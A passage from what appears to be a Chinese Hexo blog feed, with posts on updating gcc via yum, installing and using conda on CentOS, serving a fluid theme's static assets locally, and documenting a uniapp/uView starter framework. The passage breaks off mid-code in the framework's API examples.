    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>使用yum简单更新gcc，而不是编译安装</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>以下以更新到gcc7为例，更新到其他版本只需更改版本号即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> yum install centos-release-scl<br><span class="hljs-built_in">sudo</span> yum install devtoolset-7-gcc*<br>scl <span class="hljs-built_in">enable</span> devtoolset-7 bash<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source /opt/rh/devtoolset-7/enable&quot;</span> &gt;&gt;/etc/profile <span class="hljs-comment">#添加这行长期使用</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CentOS安装并使用conda</title>
    <link href="/2022/06/newpost-45/"/>
    <url>/2022/06/newpost-45/</url>
    
    <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p><a href="https://docs.conda.io/en/latest/">conda</a>是一款适用于任何语言（Python、R、Ruby、Lua、Scala、Java、JavaScript、C/C++、Fortran 等）的包、依赖项和环境管理工具。</p><span id="more"></span><h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h1><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1. 下载"></a>1. 下载</h3><p><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a></p><h3 id="2-依赖"><a href="#2-依赖" class="headerlink" title="2. 依赖"></a>2. 依赖</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install gcc libsm6 libXext libSM libXrender<br></code></pre></td></tr></table></figure><h3 id="3-赋权"><a href="#3-赋权" class="headerlink" title="3. 赋权"></a>3. 赋权</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chomd 777 Anaconda3xxxx.sh<br></code></pre></td></tr></table></figure><h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4. 执行"></a>4. 执行</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">bash Anaconda3xxxx.sh<br></code></pre></td></tr></table></figure><h3 id="5-添加到环境变量"><a href="#5-添加到环境变量" class="headerlink" title="5. 添加到环境变量"></a>5. 添加到环境变量</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/profile<br><span class="hljs-comment"># 结尾添加 export PATH=$PATH:/root/anaconda3/bin</span><br><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure><h1 id="三、使用"><a href="#三、使用" class="headerlink" title="三、使用"></a>三、使用</h1><h3 id="1-创建名为env-name的Python3-6环境"><a href="#1-创建名为env-name的Python3-6环境" class="headerlink" title="1. 创建名为env_name的Python3.6环境"></a>1. 创建名为env_name的Python3.6环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda create -n env_name python=3.6 pip<br></code></pre></td></tr></table></figure><h3 id="2-使用env-name环境"><a href="#2-使用env-name环境" class="headerlink" title="2. 使用env_name环境"></a>2. 使用env_name环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda activate env_name<br></code></pre></td></tr></table></figure><h3 id="3-退出环境"><a href="#3-退出环境" class="headerlink" title="3. 退出环境"></a>3. 退出环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda deactivate<br></code></pre></td></tr></table></figure><h3 id="4-复制某个虚拟环境"><a href="#4-复制某个虚拟环境" class="headerlink" title="4. 复制某个虚拟环境"></a>4. 复制某个虚拟环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda create --n new_env_name --<span class="hljs-built_in">clone</span> old_env_name<br></code></pre></td></tr></table></figure><h3 id="5-删除某个环境"><a href="#5-删除某个环境" class="headerlink" title="5. 删除某个环境"></a>5. 删除某个环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda remove --n env_name --all<br></code></pre></td></tr></table></figure><h3 id="6-查看当前所有环境"><a href="#6-查看当前所有环境" class="headerlink" title="6. 查看当前所有环境"></a>6. 查看当前所有环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda info --envs<br><span class="hljs-comment"># 或者</span><br>conda <span class="hljs-built_in">env</span> list<br></code></pre></td></tr></table></figure><h3 id="7-查看当前虚拟环境下的所有安装包"><a href="#7-查看当前虚拟环境下的所有安装包" class="headerlink" title="7. 查看当前虚拟环境下的所有安装包"></a>7. 查看当前虚拟环境下的所有安装包</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda list <span class="hljs-comment"># 需进入该虚拟环境</span><br><span class="hljs-comment"># 或者</span><br>conda list -n env_name<br></code></pre></td></tr></table></figure><h3 id="8-安装或卸载包-进入虚拟环境之后）"><a href="#8-安装或卸载包-进入虚拟环境之后）" class="headerlink" title="8. 安装或卸载包(进入虚拟环境之后）"></a>8. 安装或卸载包(进入虚拟环境之后）</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda install xxx<br>conda install xxx=版本号 <span class="hljs-comment"># 指定版本号</span><br>conda install xxx -i 源名称或链接 <span class="hljs-comment"># 指定下载源</span><br>conda uninstall xxx<br></code></pre></td></tr></table></figure><h3 id="9-分享虚拟环境"><a href="#9-分享虚拟环境" class="headerlink" title="9. 分享虚拟环境"></a>9. 分享虚拟环境</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda <span class="hljs-built_in">env</span> <span class="hljs-built_in">export</span> &gt; environment.yml <span class="hljs-comment"># 导出当前虚拟环境</span><br>conda <span class="hljs-built_in">env</span> create -f environment.yml <span class="hljs-comment"># 创建保存的虚拟环境</span><br></code></pre></td></tr></table></figure><h3 id="10-升级"><a href="#10-升级" class="headerlink" title="10. 升级"></a>10. 升级</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda update conda<br>conda update anaconda<br></code></pre></td></tr></table></figure><h3 id="11-卸载"><a href="#11-卸载" class="headerlink" title="11. 卸载"></a>11. 卸载</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -rf anaconda<br></code></pre></td></tr></table></figure><blockquote><p>参考<a href="https://docs.conda.io/en/latest/">conda文档</a>、<a href="https://blog.csdn.net/zhognsc08/article/details/122735811">Conda常用命令</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将fluid主题博客的静态资源由第三方改为本地存储</title>
    <link href="/2022/06/newpost-44/"/>
    <url>/2022/06/newpost-44/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>将fluid主题博客的静态资源由第三方改为本地存储，以防止第三方服务挂掉导致博客无法正常运行。</p><span id="more"></span><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>在此前，博客使用的静态资源均来自第三方，但是第三方服务未必可以持久可靠地提供服务。一旦第三方服务挂掉，对于博客的影响是毁灭性的。我就遇到了由于第三方服务挂掉，导致页面样式全部乱了的情况。这与我使用hexo的初衷相违背，使用hexo的一个最重要的原因，就是因为其是纯静态的，只需部署到可靠服务商，就可以几乎永久地、低成本地提供服务。但是第三方这个不稳定因素，严重威胁了本人博客的稳定性。因此在权衡利（速度快，省自己流量）弊（未必可靠）后决定将静态资源存储在本地。</p><p>乱了之后如下图：</p><img src="/2022/06/newpost-44/image-20220621163733835.png" class="" title="image-20220621163733835"><img src="/2022/06/newpost-44/image-20220621163748466.png" class="" title="image-20220621163748466"><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、静态资源上传"><a href="#一、静态资源上传" class="headerlink" title="一、静态资源上传"></a>一、静态资源上传</h2><p>在<code>source</code>文件夹下新建<code>/assets/static/</code>目录，复制<a href="https://github.com/dr34m-cn/hexo/tree/master/source/assets/static">https://github.com/dr34m-cn/hexo/tree/master/source/assets/static</a>下所有文件和文件夹没到你本地的<code>/source/assets/static/</code>目录下。</p><h2 id="二、配置修改"><a href="#二、配置修改" class="headerlink" title="二、配置修改"></a>二、配置修改</h2><p>找到fluid的配置文件，翻到文件末尾，修改如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">static_prefix:</span><br>  <span class="hljs-comment"># 内部静态</span><br>  <span class="hljs-comment"># Internal static</span><br>  <span class="hljs-attr">internal_js:</span> <span class="hljs-string">/js</span><br>  <span class="hljs-attr">internal_css:</span> <span class="hljs-string">/css</span><br>  <span class="hljs-attr">internal_img:</span> <span class="hljs-string">/img</span><br><br>  <span class="hljs-attr">anchor:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">github_markdown:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">jquery:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">bootstrap:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">prismjs:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">tocbot:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">typed:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">fancybox:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">nprogress:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">mathjax:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">katex:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">busuanzi:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">clipboard:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">mermaid:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">valine:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">waline:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">gitalk:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">disqusjs:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">twikoo:</span> <span class="hljs-string">/assets/static/</span><br><br>  <span class="hljs-attr">hint:</span> <span class="hljs-string">/assets/static/</span><br></code></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件，添加<code>skip_render: assets/static/*</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个上手即用的通用公众号/小程序/h5/app框架</title>
    <link href="/2022/06/newpost-43/"/>
    <url>/2022/06/newpost-43/</url>
    
    <content type="html"><![CDATA[<p>源码地址：<a href="https://github.com/dr34m-cn/uniapp-demo">https://github.com/dr34m-cn/uniapp-demo</a></p><p>框架后期或有更新，请以源码中<code>README.md</code>文档为准</p><p>本通用框架基于<code>uniapp</code>与<code>uView UI 2.0.31</code>，封装了日常开发中最常用的接口请求、数据中心、环境配置等操作，上手即用。</p><h2 id="1-运维"><a href="#1-运维" class="headerlink" title="1. 运维"></a>1. 运维</h2><h3 id="1-1-构建"><a href="#1-1-构建" class="headerlink" title="1.1 构建"></a>1.1 构建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">H5 生产</span><br>npm run build<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">H5 dev</span><br>npm run build:dev<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">微信小程序</span><br>npm run build:mp-weixin<br></code></pre></td></tr></table></figure><p>其他平台构建，例如快应用、支付宝小程序等详见<a href="https://uniapp.dcloud.net.cn/quickstart-cli.html#%E8%BF%90%E8%A1%8C%E3%80%81%E5%8F%91%E5%B8%83uni-app">uniapp官方文档</a></p><h3 id="1-2-H5修改前缀"><a href="#1-2-H5修改前缀" class="headerlink" title="1.2 H5修改前缀"></a>1.2 H5修改前缀</h3><p>修改<code>/src/manifest.json</code>，例如修改前缀为<code>/h5</code>如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;h5&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;title&quot;</span> : <span class="hljs-string">&quot;标题&quot;</span>,<br>        <span class="hljs-string">&quot;router&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;base&quot;</span> : <span class="hljs-string">&quot;/h5/&quot;</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>更多配置详见<a href="https://uniapp.dcloud.net.cn/collocation/manifest.html">uniapp官方文档</a></p><h3 id="1-3-配置文件"><a href="#1-3-配置文件" class="headerlink" title="1.3 配置文件"></a>1.3 配置文件</h3><p>配置文件在<code>/src/config/index.js</code></p><h2 id="2-开发"><a href="#2-开发" class="headerlink" title="2. 开发"></a>2. 开发</h2><h3 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装依赖</span><br>npm install<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行</span><br>npm run serve<br></code></pre></td></tr></table></figure><p>其他平台运行，例如快应用、支付宝小程序等详见<a href="https://uniapp.dcloud.net.cn/quickstart-cli.html#%E8%BF%90%E8%A1%8C%E3%80%81%E5%8F%91%E5%B8%83uni-app">uniapp官方文档</a></p><h3 id="2-2-说明"><a href="#2-2-说明" class="headerlink" title="2.2 说明"></a>2.2 说明</h3><h4 id="2-2-1-配置"><a href="#2-2-1-配置" class="headerlink" title="2.2.1 配置"></a>2.2.1 配置</h4><p>通用配置请放在<code>/src/config/index.js</code>中，例如后端地址。</p><h4 id="2-2-2-数据中心"><a href="#2-2-2-数据中心" class="headerlink" title="2.2.2 数据中心"></a>2.2.2 数据中心</h4><p>数据中心统一管理需要在全局使用的数据，可以临时存储（h5刷新页面、小程序/app退出等操作数据就会丢失）或者持久化存储。</p><p>在这里定义和存储的数据是全局动态响应的，这让您无需繁琐地写监听方法。</p><p>配置文件在<code>/src/store/index.js</code>，建议命名为<code>vuex_</code>开头，以便与页面数据区分避免冲突。</p><h5 id="2-2-2-1-定义"><a href="#2-2-2-1-定义" class="headerlink" title="2.2.2.1 定义"></a>2.2.2.1 定义</h5><h6 id="2-2-2-1-1-临时存储"><a href="#2-2-2-1-1-临时存储" class="headerlink" title="2.2.2.1.1 临时存储"></a>2.2.2.1.1 临时存储</h6><p>直接在<code>/src/store/index.js</code>中定义，如下边的<code>vuex_tmp</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> store = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>    <span class="hljs-attr">state</span>: &#123;<br>        <span class="hljs-attr">vuex_token</span>: lifeData.<span class="hljs-property">vuex_token</span> ? lifeData.<span class="hljs-property">vuex_token</span> : <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">vuex_tmp</span>: <span class="hljs-literal">null</span><br>    &#125;,<br><br>    ...<br><br>&#125;)<br></code></pre></td></tr></table></figure><h6 id="2-2-2-1-2-持久化存储"><a href="#2-2-2-1-2-持久化存储" class="headerlink" title="2.2.2.1.2 持久化存储"></a>2.2.2.1.2 持久化存储</h6><p>在<code>/src/store/index.js</code>中定义，并写入<code>saveStateKeys</code>中，如下边的<code>vuex_token</code>，定义的时候格式为<code>vuex_token: lifeData.vuex_token ? lifeData.vuex_token : null</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 需要永久存储，且下次APP启动需要取出的，在state中的变量名</span><br><span class="hljs-keyword">let</span> saveStateKeys = [<span class="hljs-string">&#x27;vuex_token&#x27;</span>];<br><br>...<br><br><span class="hljs-keyword">const</span> store = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>    <span class="hljs-attr">state</span>: &#123;<br>        <span class="hljs-attr">vuex_token</span>: lifeData.<span class="hljs-property">vuex_token</span> ? lifeData.<span class="hljs-property">vuex_token</span> : <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">vuex_tmp</span>: <span class="hljs-literal">null</span><br>    &#125;,<br><br>    ...<br><br>&#125;)<br></code></pre></td></tr></table></figure><h5 id="2-2-2-2-使用"><a href="#2-2-2-2-使用" class="headerlink" title="2.2.2.2 使用"></a>2.2.2.2 使用</h5><h6 id="2-2-2-2-1-取值"><a href="#2-2-2-2-1-取值" class="headerlink" title="2.2.2.2.1 取值"></a>2.2.2.2.1 取值</h6><ul><li>页面<code>&lt;template&gt;</code>中取值<code>&#123;&#123; vuex_token &#125;&#125;</code></li><li>js代码（包括<code>App.vue</code>页面）<code>&lt;script&gt;</code>中取值<code>this.vuex_token</code></li><li>拦截器等通用组件中（须获取上下文vm）取值<code>vm.vuex_token</code></li></ul><h6 id="2-2-2-2-2-设值"><a href="#2-2-2-2-2-设值" class="headerlink" title="2.2.2.2.2 设值"></a>2.2.2.2.2 设值</h6><p>可以设定值的类型为<code>基本数据类型</code>和<code>可以进行序列化的对象/列表等</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 字符串</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$u</span>.<span class="hljs-title function_">vuex</span>(<span class="hljs-string">&#x27;vuex_token&#x27;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>);<br><span class="hljs-comment">// 对象</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$u</span>.<span class="hljs-title function_">vuex</span>(<span class="hljs-string">&#x27;vuex_token&#x27;</span>, &#123;<br>    <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;token&#x27;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;xxxxx&#x27;</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-2-3-接口"><a href="#2-2-3-接口" class="headerlink" title="2.2.3 接口"></a>2.2.3 接口</h4><p>接口基于<a href="https://www.quanzhan.co/luch-request/">luch-request</a>，<code>uView</code>对其简单封装，本示例使用的是<code>uView</code>封装后的，对最常用的场景做了说明，更详细的文档见<a href="https://www.uviewui.com/js/http.html">uView的http请求</a></p><h5 id="2-2-3-1-统一拦截器"><a href="#2-2-3-1-统一拦截器" class="headerlink" title="2.2.3.1 统一拦截器"></a>2.2.3.1 统一拦截器</h5><p>接口拦截器在<code>/src/utils/request.js</code>中，可以根据需要自行修改；</p><p>对于请求：</p><ul><li>凡是不以<code>/login</code>开头，且当前已有<code>token</code>的（数据中心<code>vuex_token</code>字段值非<code>null</code>），将自动在请求头<code>header.token</code>存入已有的<code>token</code>值；</li></ul><p>对于响应：</p><ul><li>响应值<code>response.statusCode</code>非<code>200</code>的，将拦截，弹框提示并抛出异常，可在接口<code>catch</code>中捕获；</li><li>响应数据存在<code>response.data.code</code>字段的，判断<code>code</code>值：<ul><li>值为<code>401</code>将拦截并抛出异常，可在接口<code>catch</code>中捕获，建议在拦截器中统一处理；</li><li>值非<code>200</code>且非<code>401</code>将拦截，弹框提示并抛出异常，可在接口<code>catch</code>中捕获；</li><li>值为<code>200</code>的，将返回<code>response.data</code>，可在接口<code>then</code>中获取；</li></ul></li><li>响应数据不存在<code>response.data.code</code>字段的，将返回<code>response.data</code>，可在接口<code>then</code>中获取。</li></ul><h5 id="2-2-3-2-api集中管理"><a href="#2-2-3-2-api集中管理" class="headerlink" title="2.2.3.2 api集中管理"></a>2.2.3.2 api集中管理</h5><p>提示：get请求第一个参数是配置，post请求第一个参数是请求值，第二个才是配置</p><p>在<code>/src/api/</code>目录下新建<code>api.js</code>文件，内容如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span><br><br><span class="hljs-comment">// get请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getMenu1</span> = (<span class="hljs-params"></span>) =&gt; http.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/ebapi/public_api/index`</span>)<br><br><span class="hljs-comment">// get请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getMenu2</span> = (<span class="hljs-params">id</span>) =&gt; http.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/ebapi/public_api/index/<span class="hljs-subst">$&#123;id&#125;</span>`</span>)<br><br><span class="hljs-comment">// get请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getMenu3</span> = (<span class="hljs-params">params</span>) =&gt; http.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ebapi/public_api/index&#x27;</span>, &#123;params&#125;)<br><br><span class="hljs-comment">// get请求（带header等配置）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getMenu4</span> = (<span class="hljs-params">params</span>) =&gt; http.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ebapi/public_api/index&#x27;</span>, &#123;<br>    params,<br>    <span class="hljs-attr">header</span>: &#123;<br>        <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;1111&#x27;</span><br>    &#125;<br>&#125;)<br><br><span class="hljs-comment">// post请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">postMenu</span> = (<span class="hljs-params">data</span>) =&gt; http.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/ebapi/public_api/index&#x27;</span>, data)<br><br><span class="hljs-comment">// post请求（带header等）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">postMenu</span> = (<span class="hljs-params">data</span>) =&gt; http.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/ebapi/public_api/index&#x27;</span>, data, &#123;<br>    <span class="hljs-attr">header</span>: &#123;<br>        <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;1111&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">responseType</span>: <span class="hljs-string">&#x27;arraybuffer&#x27;</span><br>&#125;)<br><br><span class="hljs-comment">// 更多请求使用</span><br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">get</span>(url[, config])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">post</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">delete</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">put</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">middleware</span>(config)<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">request</span>(config)<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">upload</span>(url[, config])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">head</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">connect</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">options</span>(url[, data[, config]])<br>uni.<span class="hljs-property">$u</span>.<span class="hljs-property">http</span>.<span class="hljs-title function_">trace</span>(url[, data[, config]])<br></code></pre></td></tr></table></figure><h5 id="2-2-3-3-api使用"><a href="#2-2-3-3-api使用" class="headerlink" title="2.2.3.3 api使用"></a>2.2.3.3 api使用</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123;<br>    getMenu2,<br>    getMenu3<br>&#125; <span class="hljs-keyword">from</span> <span 